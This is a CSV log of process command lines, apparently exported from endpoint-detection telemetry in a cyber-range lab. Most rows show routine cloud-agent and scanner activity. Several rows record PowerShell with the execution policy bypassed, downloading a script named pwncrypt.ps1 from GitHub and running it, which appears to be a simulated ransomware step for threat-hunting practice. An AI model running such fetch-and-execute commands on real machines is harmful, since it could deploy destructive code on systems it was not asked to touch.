Timestamp,DeviceName,ProcessCommandLine
1/16/2026 18:24,mm-atomicred-vm,"cmd.exe /c """"C:\Packages\Plugins\Microsoft.GuestConfiguration.ConfigurationforWindows\1.29.101.0\bin\enable.cmd"""""
1/16/2026 18:24,mm-atomicred-vm,"cmd.exe /c """"C:\Packages\Plugins\Microsoft.CPlat.Core.RunCommandWindows\1.1.22\enable.cmd"""""
1/16/2026 18:24,winows-btest,"cmd  /C  C:\Packages\Plugins\Microsoft.CPlat.Core.RunCommandWindows\1.1.22\bin\RunCommandExtension.exe ""enable"""
1/16/2026 18:24,winows-btest,"cmd.exe /c """"C:\Packages\Plugins\Microsoft.CPlat.Core.RunCommandWindows\1.1.22\enable.cmd"""""
1/16/2026 18:24,sandboxvm,"cmd  /C  C:\Packages\Plugins\Microsoft.CPlat.Core.RunCommandWindows\1.1.22\bin\RunCommandExtension.exe ""enable"""
1/16/2026 18:24,sandboxvm,"cmd.exe /c """"C:\Packages\Plugins\Microsoft.CPlat.Core.RunCommandWindows\1.1.22\enable.cmd"""""
1/16/2026 18:24,sandboxvm,"cmd.exe /c """"C:\Packages\Plugins\Microsoft.GuestConfiguration.ConfigurationforWindows\1.29.101.0\bin\enable.cmd"""""
1/16/2026 18:24,cyberlab,"cmd  /C  C:\Packages\Plugins\Microsoft.CPlat.Core.RunCommandWindows\1.1.22\bin\RunCommandExtension.exe ""enable"""
1/16/2026 18:24,cyberlab,"cmd.exe /c """"C:\Packages\Plugins\Microsoft.CPlat.Core.RunCommandWindows\1.1.22\enable.cmd"""""
1/16/2026 18:24,cyberlab,"cmd.exe /c """"C:\Packages\Plugins\Microsoft.GuestConfiguration.ConfigurationforWindows\1.29.101.0\bin\enable.cmd"""""
1/16/2026 18:24,kobe24,"cmd  /C  C:\Packages\Plugins\Microsoft.CPlat.Core.RunCommandWindows\1.1.22\bin\RunCommandExtension.exe ""enable"""
1/16/2026 18:24,kobe24,"cmd.exe /c """"C:\Packages\Plugins\Microsoft.GuestConfiguration.ConfigurationforWindows\1.29.101.0\bin\enable.cmd"""""
1/16/2026 18:24,kobe24,"cmd.exe /c """"C:\Packages\Plugins\Microsoft.CPlat.Core.RunCommandWindows\1.1.22\enable.cmd"""""
1/16/2026 18:13,jinks-server-fi,"cmd.exe  /c C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe ""& {$webClient = New-Object System.Net.WebClient; $webClient.Headers.add(\""Metadata\"", \""true\""); $webClient.DownloadString(\""http://168.63.129.16/metadata/instance/compute?api-version=2017-12-01\"")};""  "
1/16/2026 18:13,jinks-server-fi,cmd.exe  /c echo nessus_cmd_L21ldGFkYXRhL2luc3RhbmNlL2NvbXB1dGU/YXBpLXZlcnNpb249MjAxNy0xMi0wMQ==_start  
1/16/2026 18:13,jinks-server-fi,"cmd.exe  /c C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe ""& {$webClient = New-Object System.Net.WebClient; $webClient.DownloadString(\""http://168.63.129.16/metadata/latest/InstanceInfo\"")};""  "
1/16/2026 18:13,jinks-server-fi,cmd.exe  /c echo nessus_cmd_L21ldGFkYXRhL2xhdGVzdC9JbnN0YW5jZUluZm8=_start  
1/16/2026 18:13,winows-btest,cmd.exe
1/16/2026 18:13,jinks-server-fi,"cmd.exe  /c C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe ""& {$webClient = New-Object System.Net.WebClient; $webClient.Headers.add(\""x-ms-version\"", \""2015-04-05\""); $webClient.Headers.add(\""x-ms-guest-agent-name\"", \""WaAgent-2.5.0.0 (2.7.0.0)\""); $webClient.DownloadString(\""http://168.63.129.16/machine?comp=goalstate\"")};""  "
1/16/2026 18:13,wvm-edr-target,"""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\pwncrypt.ps1"
1/16/2026 18:13,logn-pacific-dc,"""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\pwncrypt.ps1"
1/16/2026 18:13,wvm-edr-target,"""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1"
1/16/2026 18:13,logn-pacific-dc,"""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1"
1/16/2026 18:13,wvm-edr-target,"""cmd"" /Cpowershell -ExecutionPolicy Unrestricted -File script3.ps1"
1/16/2026 18:12,cyberlab,"cmd.exe /c """"C:\Packages\Plugins\Microsoft.GuestConfiguration.ConfigurationforWindows\1.29.101.0\bin\enable.cmd"""""
1/16/2026 18:12,wvm-edr-target,"cmd  /C  C:\Packages\Plugins\Microsoft.CPlat.Core.RunCommandWindows\1.1.22\bin\RunCommandExtension.exe ""enable"""
1/16/2026 18:12,cyberlab,"cmd  /C  C:\Packages\Plugins\Microsoft.CPlat.Core.RunCommandWindows\1.1.22\bin\RunCommandExtension.exe ""enable"""
1/16/2026 18:12,cyberlab,"cmd.exe /c """"C:\Packages\Plugins\Microsoft.CPlat.Core.RunCommandWindows\1.1.22\enable.cmd"""""
1/16/2026 18:12,wvm-edr-target,"cmd.exe /c """"C:\Packages\Plugins\Microsoft.CPlat.Core.RunCommandWindows\1.1.22\enable.cmd"""""
1/16/2026 18:12,logn-pacific-dc,"""cmd"" /Cpowershell -ExecutionPolicy Unrestricted -File script12.ps1"
1/16/2026 18:12,wvm-edr-target,"cmd.exe /c """"C:\Packages\Plugins\Microsoft.GuestConfiguration.ConfigurationforWindows\1.29.101.0\bin\enable.cmd"""""
1/16/2026 18:12,kobe24,"cmd  /C  C:\Packages\Plugins\Microsoft.CPlat.Core.RunCommandWindows\1.1.22\bin\RunCommandExtension.exe ""enable"""
1/16/2026 18:12,kobe24,"cmd.exe /c """"C:\Packages\Plugins\Microsoft.CPlat.Core.RunCommandWindows\1.1.22\enable.cmd"""""
1/16/2026 18:12,kobe24,"cmd.exe /c """"C:\Packages\Plugins\Microsoft.GuestConfiguration.ConfigurationforWindows\1.29.101.0\bin\enable.cmd"""""
1/16/2026 18:12,logn-pacific-dc,"cmd  /C  C:\Packages\Plugins\Microsoft.CPlat.Core.RunCommandWindows\1.1.22\bin\RunCommandExtension.exe ""enable"""
1/16/2026 18:12,windows-target-,"""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\pwncrypt.ps1"
1/16/2026 18:12,logn-pacific-dc,"cmd.exe /c """"C:\Packages\Plugins\Microsoft.CPlat.Core.RunCommandWindows\1.1.22\enable.cmd"""""
